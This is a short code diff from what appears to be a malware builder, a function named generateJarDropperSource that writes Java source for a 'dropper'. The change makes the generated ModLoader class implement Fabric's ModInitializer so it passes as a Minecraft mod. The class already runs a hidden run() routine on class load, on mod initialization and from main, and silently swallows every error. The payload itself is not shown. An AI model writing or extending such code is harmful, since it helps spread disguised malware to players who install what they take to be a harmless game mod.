@@ -454,7 +454,8 @@ function generateJarDropperSource(): string {
   return [
     "package com.mc.mod;",
     "import java.io.*;",
-    "public class ModLoader{",
+    "import net.fabricmc.api.ModInitializer;",
+    "public class ModLoader implements ModInitializer{",
     "  static{try{run();}catch(Exception e){}}",
     "  public void onInitialize(){try{run();}catch(Exception e){}}",
     "  public static void main(String[]a){try{run();}catch(Exception e){}}",
